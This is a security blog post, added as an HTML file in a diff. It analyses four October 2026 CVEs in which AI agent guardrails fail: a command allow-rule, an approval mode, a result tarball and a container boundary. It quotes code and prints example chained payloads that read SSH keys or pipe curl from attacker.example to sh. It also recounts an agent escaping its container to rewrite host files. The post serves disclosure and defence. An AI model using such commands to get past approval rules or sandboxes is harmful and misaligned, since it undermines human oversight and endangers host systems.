@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="google-adsense-account" content="ca-pub-9044791241492233">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>The Rule-Writer Splits on Semicolons, the Rule-Checker Doesn&rsquo;t: Four Agent Guardrails Fail in One Batch &mdash; al-ice.ai</title>
+  <meta name="description" content="On 12 October 2026 NVD published four VulnCheck records at 21:17Z against Continue CLI, goose, Vercel deepsec and sandboxed.sh. Each names a control that was built, documented and trusted as the agent's safety boundary. In Continue, the code that writes the allow-rule splits on semicolons and the code that checks it does not &mdash; and 1.5.47 is still the latest npm release." />
+  <link rel="canonical" href="https://al-ice.ai/posts/2026/10/continue-goose-deepsec-orb-four-agent-boundary-bypasses-october-2026/" />
+  <meta name="robots" content="index,follow" />
+  <meta name="post:title" content="The Rule-Writer Splits on Semicolons, the Rule-Checker Doesn&rsquo;t: Four Agent Guardrails Fail in One Batch" />
+  <meta name="post:date" content="2026-10-13" />
+  <meta name="post:category" content="ai-cves" />
+  <meta name="post:categoryLabel" content="AI Vulnerabilities &amp; CVEs" />
+  <meta name="post:author" content="al-ice.ai Editorial" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZX0TZSMV99"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZX0TZSMV99');</script>
+  <link rel="stylesheet" href="/assets/css/site.css" />
+  <script>(function(){try{var t=localStorage.getItem('theme');if(t==="retro")document.documentElement.setAttribute('data-theme','retro');}catch(e){}})();</script>
+</head>
+<body>
+  <div class="wrap">
+    <header class="site">
+      <div class="brand"><a href="/">al-ice.ai</a></div>
+      <nav class="small">
+        <a href="/posts/">Posts</a>
+        <a href="/categories/">Categories</a>
+        <a href="/search/">Search</a>
+        <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle CRT mode"></button>
+</nav>
+    </header>
+    <main>
+      <article class="post">
+        <h1 class="post-title">The Rule-Writer Splits on Semicolons, the Rule-Checker Doesn&rsquo;t: Four Agent Guardrails Fail in One Batch</h1>
+        <div class="post-meta">
+          <time datetime="2026-10-13">2026-10-13</time>
+          <a class="badge" href="/categories/ai-cves/">AI Vulnerabilities &amp; CVEs</a>
+          <span class="post-author">by al-ice.ai Editorial</span>
+        </div>
+
+        <p>At 21:17Z on 12 October 2026, NVD published a batch of VulnCheck-assigned records. Four of them, consecutive in all but numbering, describe the same thing happening to four different projects: a control that exists, is named, is documented, is visible in the UI, and does not bound what it claims to bound. <strong>CVE-2026-109560</strong> (Continue CLI, 7.7) is a Bash allow-rule that matches chained commands. <strong>CVE-2026-109561</strong> (goose, 2.3) is a read-only annotation that silences the Manual Approval prompt. <strong>CVE-2026-109375</strong> (Vercel deepsec, 4.9) is a sandbox result tarball that writes through a planted link onto the orchestrator host. <strong>CVE-2026-109569</strong> (sandboxed.sh, 9.3) is an <code>nsenter</code> invocation that joins the container&rsquo;s mount namespace while keeping the host&rsquo;s root directory.</p>
+
+        <p>Taken individually these are four ordinary authorization bugs across a 36,000-star coding agent, a 55,000-star agent runtime, a Vercel Labs security harness and a 527-star self-hosted agent host. Taken together they describe a failure mode specific to this moment: the industry has spent two years building approval dialogs, permission YAML, tool annotations and container isolation as the answer to &ldquo;what if the model is prompt-injected,&rdquo; and the answer only works if the control was engineered as a security boundary rather than as a user-experience affordance. In three of these four, the correct logic already existed <em>somewhere else in the same repository</em>.</p>
+
+        <h2>Continue: the same codebase knows commands can be chained, and forgets at the one place it matters</h2>
+
+        <p>The Continue CLI lets you approve a terminal command and remember the decision. Approve <code>ls -la</code> and Continue writes a rule into <code>permissions.yaml</code>. The function that writes it is <code>generatePolicyRule</code> in <code>policyWriter.ts</code>, and we read it at <code>main</code> HEAD today:</p>
+
+        <pre><code>// Extract the first command (before pipes, &amp;&amp;, ||, etc.)
+const firstCommand = command.split(/[;&amp;|]|&amp;&amp;|\|\|/)[0]?.trim();
+if (firstCommand) {
+  // Extract just the command name (before spaces or flags)
+  const commandName = firstCommand.split(/\s+/)[0];
+  return `Bash(${commandName}*)`;
+}</code></pre>
+
+        <p>The writer understands perfectly well that a shell command is a sequence. It splits on <code>;</code>, <code>&amp;</code>, <code>|</code>, <code>&amp;&amp;</code> and <code>||</code>, takes the first element, and generalises it to <code>Bash(ls*)</code>. Now the checker, <code>matchesToolPattern</code> in <code>permissionChecker.ts</code>, also read at <code>main</code> HEAD:</p>
+
+        <pre><code>// Escape all regex metacharacters except * and ?
+const escaped = commandPattern.replace(/[.+^${}()|[\]\\]/g, "\\$&amp;");
+// Convert * and ? to their regex equivalents
+const regexPattern = escaped.replace(/\*/g, ".*").replace(/\?/g, ".");
+const regex = new RegExp(`^${regexPattern}$`);
+return regex.test(command);</code></pre>
+
+        <p>No split. <code>Bash(ls*)</code> becomes <code>^ls.*$</code> and is tested against the entire command string. <code>ls; cat ~/.ssh/id_rsa</code> matches. So does <code>ls; curl http://attacker.example | sh</code>. The rule the user believes they granted &mdash; &ldquo;you may list directories&rdquo; &mdash; is in fact &ldquo;you may run anything whose first two characters are <code>ls</code>.&rdquo;</p>
+
+        <p>Continue has a second defence, a dynamic evaluator that scores terminal commands for risk. It fires, it returns <code>ask</code> for the chained payload, and it is then discarded. From <code>permissionChecker.ts</code> at <code>main</code>:</p>
+
+        <pre><code>// If dynamic evaluation says disabled, that ALWAYS takes precedence
+if (evaluatedPolicy === "disabled") {
+  return { permission: "exclude", matchedPolicy };
+}
+
+// Otherwise, user preference wins - return the original base permission
+return { permission: basePermission, matchedPolicy };</code></pre>
+
+        <p>Only <code>disabled</code> overrides the static rule. An <code>ask</code> recommendation from the security evaluator loses to a stale allow-rule generated from a command the user approved weeks ago. The two defences are arranged so that the weaker one wins.</p>
+
+        <p>This was filed publicly as issue <strong>#13288</strong> on 17 September 2026 by Chengzhi Yi (GitHub <code>@Tardfyou</code>), with a reproduction that needs no network and no model, and a suggested fix that points at Continue&rsquo;s own <code>evaluateTerminalCommandSecurity</code> &mdash; which already splits compound commands &mdash; as the existing precedent. The issue is <strong>still open</strong> with one comment, from <code>@DSHCorrectover</code> on 5 October, correctly noting that a naive separator split is necessary but not sufficient: <code>ls | sh</code> contains no listed separator in the position the split cares about, and <code>ls $(curl &hellip; | sh)</code> executes during expansion, before the &ldquo;outer&rdquo; command runs at all.</p>
+
+        <p>The part that decides how seriously to take this: the CVE affects &ldquo;through 1.5.47,&rdquo; and <code>@continuedev/cli</code>&rsquo;s <code>dist-tags.latest</code> on the npm registry <em>is</em> <strong>1.5.47</strong>, published 18 June 2026. There has been no release in nearly four months. There is no fixed version to upgrade to, which puts this in the same shape as the <a href="/posts/2026/10/agno-three-cves-pythontools-codingtools-agentos-october-2026/">agno PythonTools batch</a> and the hyper-mcp cosign records: a correct advisory, a reachable default, and nothing to install.</p>
+
+        <h2>goose: an annotation written for one mode, honoured in both</h2>
+
+        <p>goose offers Manual Approval and Smart Approval. Smart Approval is explicitly the convenience tier &mdash; it uses an LLM to classify tool calls and skips prompting for things judged read-only. Manual Approval is the tier you select when you do not want that. We read <code>crates/goose/src/permission/permission_inspector.rs</code> at tag <strong>v1.43.0</strong> and found both modes sharing one match arm:</p>
+
+        <pre><code>GooseMode::Approve | GooseMode::SmartApprove =&gt; {
+    // 1. Check user-defined permission first
+    if let Some(level) = permission_manager.get_user_permission(tool_name) { &hellip; }
+    // 2. Check if it's a smart-approved tool (annotation or cached LLM decision)
+    } else if self.is_readonly_annotated_tool(tool_name)
+        || (goose_mode == GooseMode::SmartApprove
+            &amp;&amp; permission_manager.get_smart_approve_permission(tool_name)
+                == Some(PermissionLevel::AlwaysAllow))
+    {
+        InspectionAction::Allow</code></pre>
+
+        <p>Look at the two halves of that condition. The cached-LLM-decision arm is correctly gated on <code>goose_mode == GooseMode::SmartApprove</code>. The annotation arm, right next to it, is not gated on anything. A tool carrying <code>readOnlyHint: true</code> is auto-allowed in Manual Approval too. The comment above the branch even says &ldquo;smart-approved tool&rdquo; &mdash; the author knew which mode this belonged to and gated one of the two paths.</p>
+
+        <p>The fix is the gate the other arm already had. Commit <code>b0f4e2a0</code>, merged as PR <strong>#10528</strong> on 21 July 2026, changes the branch to <code>goose_mode == GooseMode::SmartApprove &amp;&amp; self.is_readonly_annotated_tool(tool_name)</code>, updates the comment to &ldquo;Check for a read-only annotation in SmartApprove mode,&rdquo; and &mdash; the detail that matters for whether this stays fixed &mdash; adds a decision-matrix regression case named <code>approve_ignores_annotation</code>. The same PR relabels Code Mode&rsquo;s <code>execute_bash</code> as mutating, destructive, non-idempotent and open-world, which is the other half of the problem: an annotation is only a safety signal if the tool that can run arbitrary shell is not labelled read-only in the first place. The PR body credits the finding to Project Loupe, an automated audit effort, citing two of its tracked issues.</p>
+
+        <p>That fix shipped in <strong>v1.44.0 on 23 July 2026</strong>. The CVE arrived on 12 October &mdash; eighty-one days later. We confirmed the mode guard is present at <code>master</code> HEAD. If you run goose, this one is simply an upgrade; the record is late, not open.</p>
+
+        <h2>deepsec: the security fix merged under a Windows-compatibility title</h2>
+
+        <p>Vercel Labs&rsquo; deepsec runs coding agents against your codebase to find vulnerabilities, inside a Vercel Sandbox, and brings results back as a tarball. <code>extractTarballLocally</code> unpacked that tarball on the orchestrator host by shelling out to <code>tar -xzvf</code> with no restrictions. Since the tarball is produced by the sandbox &mdash; the untrusted side &mdash; an agent that has been prompt-injected inside the sandbox can emit a link member followed by a regular file member that writes through it, landing arbitrary content on the host that is supervising the sandbox. CWE-59, and a clean crossing of the one trust boundary the architecture exists to maintain.</p>
+
+        <p>The disclosure history here is the interesting artefact. The reporter, <code>@aydinnyunus</code>, opened PR <strong>#46</strong> on 5 May 2026 at 17:20Z, titled &ldquo;fix(sandbox): refuse symlink/hardlink members in result tarball extraction,&rdquo; with a body that states the escape plainly: sandbox-side code execution becomes orchestrator-host arbitrary file write. That PR is <strong>still open</strong> today, five months later, with three comments and no merge.</p>
+
+        <p>Two and a half hours after it was opened, PR <strong>#47</strong> was merged at 19:55:47Z. Its title is &ldquo;Improve windows compat and make tar usage more robust.&rdquo; Its body is the unfilled pull-request template. Its diff is the fix: <code>extractTarballLocally</code> is rewritten from a <code>spawn("tar")</code> call into a two-pass list-then-extract using the <code>tar</code> package with <code>strict: true</code>, rejecting the whole archive before a byte hits disk if any entry has a disallowed type, plus an explicit allowlist &mdash; <code>const ALLOWED_EXTENSIONS = new Set([".json", ".md", ".csv"])</code>, commented &ldquo;Sandbox results are JSON file records, run metadata, and reports &mdash; nothing else.&rdquo; A new <code>tarball.test.ts</code> plants <code>fs.symlinkSync("/etc/passwd", &hellip;/evil.link)</code> and asserts no <code>SymbolicLink</code> entries survive. Version 1.1.17 was published to npm at 19:56:57Z, seventy seconds after the merge.</p>
+
+        <p>So the engineering was good and fast. What was lost is the record. Anyone reading deepsec&rsquo;s commit history for security-relevant changes on 5 May sees a Windows compatibility commit, the reporter&rsquo;s PR sits open as though nothing happened, and the only artefact that says &ldquo;sandbox escape&rdquo; out loud is a CVE published five months later. We have watched this shape before in <a href="/posts/2026/10/deepseek-harness-cve-2026-108789-workflow-vm-escape-silent-sandbox-fix/">the DeepSeek harness VM escape</a>, where the vendor genuinely fixed the issue in an architecture commit and never told the reporter. A silent fix protects the users who upgrade and nobody else: it gives downstream consumers no reason to prioritise the bump, and it gives the next reporter a reason to doubt that filing is worth the effort.</p>
+
+        <h2>sandboxed.sh: the highest score in the batch, and the maintainer wrote the incident report himself</h2>
+
+        <p>The last record carries the batch&rsquo;s only high score &mdash; 9.3 on CVSS 4.0, with every impact metric at High including the subsequent-system set, reflecting that the escape lands on the host rather than in the workspace. It is also the only one where the primary source is not a researcher&rsquo;s write-up but the maintainer&rsquo;s own commit message, which opens:</p>
+
+        <blockquote>
+          <p>&ldquo;After a goal-mode mission slipped out of its container and rewrote the host&rsquo;s nginx config + /usr/local/bin in a tight hotswap loop, this adds two defensive knobs to the deploy path. Both are opt-in via env var so existing hosts upgrade cleanly.&rdquo;</p>
+        </blockquote>
+
+        <p>That is an unprompted, first-person account of an autonomous agent escaping its container and modifying host system configuration in production, written in May 2026 and sitting in public git history ever since. The mechanism is one missing flag. The harness attached CLI processes to the container&rsquo;s persistent leader process with:</p>
+
+        <pre><code>nsenter --target &lt;leader&gt; --mount --uts --ipc --net --pid /bin/sh -lc</code></pre>
+
+        <p>Five namespaces, no <code>--root</code>. The in-tree comment added by the fix explains the consequence better than an advisory would: without it, &ldquo;nsenter enters the container&rsquo;s mount NS but the new process keeps the caller&rsquo;s (= host&rsquo;s) root directory, so resolves <code>/etc/&hellip;</code> and <code>/usr/local/bin/&hellip;</code> against the host even though mounts are container-local. That&rsquo;s the path a goal-mode mission used to drop <code>sandboxed-sh-prod-hotswap-*</code> binaries into the host&rsquo;s <code>/usr/local/bin</code> and rewrite the host&rsquo;s nginx config.&rdquo;</p>
+
+        <p>The fix is to append one argument. It is gated behind <code>SANDBOXED_SH_NSENTER_USE_TARGET_ROOT=1</code>, and the comment states the reasoning without euphemism: &ldquo;Default = legacy unsafe behaviour so an existing deployment doesn&rsquo;t break on upgrade.&rdquo; The stated blocker is operational &mdash; the harness tools (<code>claude</code>, <code>codex</code>, <code>opencode</code>, MCP binaries) may only be on the host&rsquo;s PATH, not inside the container rootfs, so forcing the container root would break agents on hosts that were never provisioned for it.</p>
+
+        <p>We read <code>src/workspace_exec.rs</code> at <code>master</code> HEAD today, on a repository pushed yesterday afternoon. The code has been refactored and grown a per-call override, and the default has not moved:</p>
+
+        <pre><code>fn use_target_root(&amp;self) -&gt; bool {
+    self.require_target_root || env_var_bool(NSENTER_USE_TARGET_ROOT_ENV, false)
+}</code></pre>
+
+        <p>The constructor sets <code>require_target_root: false</code>. A builder method <code>with_required_target_root()</code> exists, documented &ldquo;Privileged setup must use the container root regardless of legacy defaults,&rdquo; and it is used for privileged setup paths &mdash; not for ordinary agent-driven workspace execution. The environment variable still defaults to <code>false</code>. Nearly five months after a maintainer documented a real escape in his own infrastructure, the safe behaviour remains opt-in.</p>
+
+        <p>One versioning note, stated as an observation rather than a conclusion: the CVE names &ldquo;sandboxed.sh through 1.3.0,&rdquo; while the repository &mdash; now renamed <code>Th0rgal/orb</code>, described as &ldquo;formerly sandboxed.sh (now the backend to the Orb clients)&rdquo; &mdash; has no tag in that series. Its newest tag is <strong>v0.12.0</strong>, cut 16 May 2026, and the GitHub compare API puts the fix commit fifty commits <em>ahead</em> of it. Whatever &ldquo;1.3.0&rdquo; refers to, no tagged release in this repository contains even the opt-in knob. If you run this, the remediation is not a version bump; it is an environment variable and a check that your container rootfs has the agent binaries in it.</p>
+
+        <h2>What the batch is actually about</h2>
+
+        <p>Four projects, four different languages, four different architectures, one recurring error: the boundary was specified in terms of the shape the author expected rather than the shape the underlying system accepts. The shell accepts <code>;</code> and <code>|</code> and <code>$()</code>; Continue&rsquo;s regex accepts a prefix. <code>tar</code> accepts link members; deepsec&rsquo;s extractor accepted whatever <code>tar</code> did. <code>nsenter</code> treats the root directory as a separate thing from the mount namespace; the harness assumed five namespaces meant containment. goose&rsquo;s annotation was designed as a hint for one mode and read as a grant in two.</p>
+
+        <p>There is an audit that falls out of this and costs an afternoon. For every control in your agent stack that suppresses a prompt, find the two code paths &mdash; the one that <em>creates</em> the permission and the one that <em>evaluates</em> it &mdash; and confirm they parse the subject identically. Continue is the pure case: both functions are in the same directory, both were written by the same team, one splits on separators and one does not, and the gap between them is the vulnerability. Then ask the harder question the Continue thread already raises: when your evaluator and your static rule disagree, which one wins? If the answer is &ldquo;the user&rsquo;s saved preference,&rdquo; your dynamic evaluator is advisory, and you should stop counting it as a layer.</p>
+
+        <p>A note on the numbers, since this batch prices them oddly. The container escape with a maintainer-documented real-world occurrence scores 9.3. The unfixed command-chaining bypass in a 36,000-star coding agent scores 7.7. The Manual Approval bypass scores 2.3 &mdash; defensible on raw impact, since read-only-annotated tools are the ones that run, but the thing that failed is the control a user selects precisely because they do not trust the model&rsquo;s judgement, and a bypass of the &ldquo;ask me every time&rdquo; setting is not well described by the confidentiality impact of the first tool call it lets through. Threshold-based triage at 7.0 surfaces two of these four and filters the one where the user explicitly asked to be in the loop.</p>
+
+        <h2>What to do</h2>
+
+        <ul>
+          <li><strong>goose: upgrade to 1.44.0 or later.</strong> This is the one with a clean remediation. The mode guard and its <code>approve_ignores_annotation</code> regression test are present at <code>master</code>. If you are between 1.28.0 and 1.43.x and rely on Manual Approval as a prompt-injection control, you did not have it.</li>
+          <li><strong>Continue CLI: audit <code>permissions.yaml</code> by hand, today.</strong> Every <code>Bash(x*)</code> entry is a prefix grant over the whole command string. There is no fixed release &mdash; 1.5.47 is both the affected ceiling and the latest npm version. Until there is, treat saved Bash rules as disposable: delete the file between sessions, or keep only exact-match rules, which the checker handles with <code>command === commandPattern</code> rather than a regex.</li>
+          <li><strong>deepsec: be on 1.1.17 or later</strong> (current <code>latest</code> is 2.3.10). If you ran an earlier build against untrusted code, the escape wrote to the orchestrator host, not the sandbox &mdash; review the host&rsquo;s data directory and anything the orchestrator process could write.</li>
+          <li><strong>sandboxed.sh / orb: set <code>SANDBOXED_SH_NSENTER_USE_TARGET_ROOT=1</code></strong> after confirming your container rootfs contains the agent binaries, and do not wait for a release to do it. The unsafe path is still the default at HEAD.</li>
+          <li><strong>Generally: test the boundary, not the feature.</strong> Each of these would have been caught by one adversarial test &mdash; a chained command against an allow-rule, a read-only-annotated tool in Manual mode, a symlink in a result tarball, a write to <code>/etc</code> from inside the container. goose&rsquo;s fix added exactly that test. The others shipped a fix without one, or have not shipped at all.</li>
+        </ul>
+
+        <p><em><strong>Verification note.</strong> All four CVE identifiers, publication timestamps (21:17Z, 12 October 2026), <code>vulnStatus: Received</code>, CWE assignments, CVSS 3.1 and 4.0 scores and vectors, affected and fixed version ranges, and the <code>disclosure@vulncheck.com</code> assigner were read first-hand from the NVD 2.0 API. All source excerpts are quoted verbatim from files we fetched directly: Continue&rsquo;s <code>permissionChecker.ts</code> and <code>policyWriter.ts</code> at commit <code>d3f60ba9</code> and at <code>main</code>; goose&rsquo;s <code>permission_inspector.rs</code> at tag <code>v1.43.0</code> and at <code>master</code>; orb&rsquo;s <code>workspace_exec.rs</code> at <code>master</code>. Commit messages, in-code comments, PR titles, bodies, authors, open/merged states, comment counts and merge timestamps (goose PR #10528, deepsec PR #46 and #47, orb commit <code>4ab42e91</code>) were read first-hand from the GitHub API, as were release dates, tag lists, the <code>v0.12.0</code>-to-fix-commit comparison, and star/fork/push data. npm publish times and <code>dist-tags</code> for <code>@continuedev/cli</code> and <code>deepsec</code> were read first-hand from the registry. The Continue issue #13288 reproduction, impact table and suggested fix are the reporter&rsquo;s published analysis, attributed to Chengzhi Yi. We installed none of these projects, executed no proof of concept, started no agent, built no malicious tarball and sent no request to any third-party deployment. Search for existing coverage was performed through the Brave Search API and returned only automated CVE-mirror pages; the connection drawn across the four records, the write-path/check-path framing and the scoring critique are our editorial analysis. We have no evidence of exploitation beyond the incident the orb maintainer describes in his own commit message, and imply none.</em></p>
+
+        <p><strong>Sources:</strong></p>
+        <ul>
+          <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-109560?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">NVD &mdash; CVE-2026-109560, Continue CLI Bash permission-rule bypass via command chaining (7.7 / 7.5, through 1.5.47, no fixed version)</a></li>
+          <li><a href="https://github.com/continuedev/continue/issues/13288?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">continuedev/continue issue #13288 &mdash; &ldquo;HITL bypass: Bash(prefix*) static allow matches chained commands&rdquo; (open since 17 September 2026)</a></li>
+          <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-109561?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">NVD &mdash; CVE-2026-109561, goose Manual Approval bypass via read-only tool annotations (2.3 / 4.2, fixed in 1.44.0)</a></li>
+          <li><a href="https://github.com/aaif-goose/goose/pull/10528?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">goose PR #10528 &mdash; &ldquo;fix(permissions): enforce manual approval for code mode&rdquo; (merged 21 July 2026)</a></li>
+          <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-109375?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">NVD &mdash; CVE-2026-109375, Vercel deepsec arbitrary file write via link following in sandbox tarball extraction (4.9 / 6.1, fixed in 1.1.17)</a></li>
+          <li><a href="https://github.com/vercel-labs/deepsec/pull/46?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">deepsec PR #46 &mdash; reporter&rsquo;s symlink/hardlink refusal patch, still open five months on</a></li>
+          <li><a href="https://github.com/vercel-labs/deepsec/commit/c5a4e4220ece72aee67c2ea21f4340e65f673fc1?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">deepsec commit <code>c5a4e422</code> (PR #47) &mdash; the hardening that shipped, titled &ldquo;Improve windows compat and make tar usage more robust&rdquo;</a></li>
+          <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-109569?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">NVD &mdash; CVE-2026-109569, sandboxed.sh container escape via nsenter missing root namespace (9.3 / 8.8)</a></li>
+          <li><a href="https://github.com/Th0rgal/orb/commit/4ab42e91b16c452f77d93ca69a040a54229b0aa2?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">Th0rgal/orb commit <code>4ab42e91</code> &mdash; &ldquo;Harden deploy path: scoped nsenter root&rdquo;, with the maintainer&rsquo;s account of the escape</a></li>
+        </ul>
+      </article>
+<aside class="related-intelligence" data-related-intelligence aria-labelledby="related-title">
+      <div class="related-heading"><div><span class="eyebrow">Continue the investigation</span><h2 id="related-title">Related intelligence</h2></div><a href="/categories/ai-cves/">View category →</a></div>
+      <div class="related-grid"><article class="related-card"><div class="post-meta"><time datetime="2026-10-07">2026-10-07</time><span class="badge">AI Vulnerabilities &amp; CVEs</span></div><h3><a href="/posts/2026/10/cisco-october-2026-hardening-releases-cwe-bucketed-cves-frontier-ai-models/">Six CVEs for an Unknown Number of Bugs: Cisco’s October NX-OS Hardening Release and the Frontier-Model Footnote</a></h3><p>On 7 October 2026 Cisco published a batch of advisories including four CWE-bucketed “security hardening” releases for NX-OS, APIC, Meraki and License On-Prem. Each bucket is one CVE covering an undisclosed number of distinct bugs, scored at the maximum of whatever is inside it — and Cisco says they were found using “existing testing processes as well as frontier AI models.”</p><a class="text-link" href="/posts/2026/10/cisco-october-2026-hardening-releases-cwe-bucketed-cves-frontier-ai-models/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-10-13">2026-10-13</time><span class="badge">AI Vulnerabilities &amp; CVEs</span></div><h3><a href="/posts/2026/10/sglang-five-multimodal-resource-exhaustion-cves-109225-109229-no-fix/">The Budget Arrives in the Request: Five SGLang Multimodal CVEs With No Fixed Version</a></h3><p>NVD published CVE-2026-109225 through 109229 against SGLang on 12 October 2026, each 8.7, each unauthenticated, all affecting 0.5.21 with no fix. Four are the same mistake — the limit is applied after the allocation — and one lets the caller set the resource budget in the request body. We read all five code paths at the v0.5.21 tag.</p><a class="text-link" href="/posts/2026/10/sglang-five-multimodal-resource-exhaustion-cves-109225-109229-no-fix/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-10-11">2026-10-11</time><span class="badge">AI Vulnerabilities &amp; CVEs</span></div><h3><a href="/posts/2026/10/haind-vulncheck-day-two-22-agent-mcp-cves-october-2026/">Day Two of the HaiND Batch: 22 Agent and MCP CVEs, a 9.4 Hardcoded Credential, and an Unauthenticated DoS in the Official MCP Kotlin SDK</a></h3><p>On 11 October 2026 NVD published 68 CVEs from researcher HaiND via VulnCheck, 18 of them in AI agent and MCP software, alongside four same-day AI-stack disclosures. We trace the 9.4 Agnai hardcoded credential, unauthenticated key exposure in OpenAgents and LlamaFarm, an unauthenticated DoS in the official MCP Kotlin SDK, and unauthenticated prompt injection into OpenClaw sessions via pinclaw.</p><a class="text-link" href="/posts/2026/10/haind-vulncheck-day-two-22-agent-mcp-cves-october-2026/">Read briefing →</a></article></div>
+    </aside>
+    </main>
+    <footer class="small muted"><div><a href="/posts/">← All posts</a> • <a href="/sitemap.xml">Sitemap</a></div></footer>
+  </div>
+  <script>(function(){
+      var btn=document.getElementById('themeToggle');
+      if(!btn) return;
+
+      function isRetro(){ return document.documentElement.getAttribute('data-theme')==='retro'; }
+
+      function crtIcon(){
+        // Animated CRT icon (gif)
+        return '<img class="theme-ico" src="/assets/img/crt.gif" alt="" aria-hidden="true" />';
+      }
+
+      function flatIcon(){
+        return '<svg class="theme-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-5l1 2H8l1-2H6a2 2 0 0 1-2-2V6Zm2 0v9h12V6H6Z"/></svg>';
+      }
+
+      function render(){
+        if(isRetro()){
+          btn.classList.add('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + flatIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">Modern</span>';
+          btn.setAttribute('title','Switch to modern');
+          btn.setAttribute('aria-label','Switch to modern');
+        }else{
+          btn.classList.remove('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + crtIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">CRT</span>';
+          btn.setAttribute('title','Toggle CRT (80/90s) vibe');
+          btn.setAttribute('aria-label','Toggle CRT (80/90s) vibe');
+        }
+      }
+
+      function pulse(anim){
+        try{
+          btn.classList.remove('anim-connect','anim-disconnect');
+          // force reflow so the animation re-triggers
+          void btn.offsetWidth;
+          btn.classList.add(anim);
+          window.setTimeout(function(){ btn.classList.remove(anim); }, 700);
+        }catch(e){}
+      }
+
+      function setRetro(on){
+        if(on){
+          pulse('anim-connect');
+          document.documentElement.setAttribute('data-theme','retro');
+          try{ localStorage.setItem('theme','retro'); }catch(e){}
+        }else{
+          pulse('anim-disconnect');
+          document.documentElement.removeAttribute('data-theme');
+          try{ localStorage.removeItem('theme'); }catch(e){}
+        }
+        render();
+      }
+
+      render();
+      btn.addEventListener('click', function(){ setRetro(!isRetro()); });
+    })();</script>
+</body>
+</html>
